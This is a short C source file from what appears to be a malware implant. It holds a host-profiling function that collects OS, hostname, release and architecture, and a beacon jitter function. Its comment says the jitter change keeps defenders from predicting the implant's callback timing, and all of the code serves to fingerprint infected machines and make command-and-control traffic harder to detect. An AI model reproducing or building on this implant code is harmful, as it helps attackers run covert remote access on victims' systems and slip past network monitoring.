#include "implant_utils.h"
#include "platform.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char *operating_system_info(void)
{
    char *os_info = malloc(512);
    if (!os_info) return NULL;

#ifdef _WIN32
    OSVERSIONINFO version;
    version.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
    GetVersionEx(&version);
    snprintf(os_info, 512, "Windows | %lu.%lu",
             version.dwMajorVersion,
             version.dwMinorVersion);

#elif __linux__ || __APPLE__
#include <sys/utsname.h>
    struct utsname info;
    uname(&info);
    snprintf(os_info, 512, "%s | %s | %s | %s",
             info.sysname,
             info.nodename,
             info.release,
             info.machine);
#else
    snprintf(os_info, 512, "Unknown OS");
#endif

    return os_info;
}

/*
 * BP3 — secure_jitter_sec
 *
 * Draws a 32-bit value from the OS entropy pool (BCryptGenRandom on Windows,
 * /dev/urandom on Linux) and maps it to [base - range, base + range].
 *
 * This replaces the original srand(time(NULL) ^ getpid()) / rand() scheme
 * whose seed space is small enough that an attacker who knows the approximate
 * implant start time can predict the entire jitter sequence and reconstruct
 * the beacon timing pattern, defeating the purpose of jitter entirely.
 */
int secure_jitter_sec(int base_sec, int range_sec)
{
    unsigned int r = 0;
    secure_random(&r, sizeof(r));

    int spread = range_sec * 2 + 1;          /* [0, spread) */
    int offset  = (int)(r % (unsigned int)spread) - range_sec;
    int result  = base_sec + offset;
    return result < 1 ? 1 : result;          /* floor at 1 second */
}
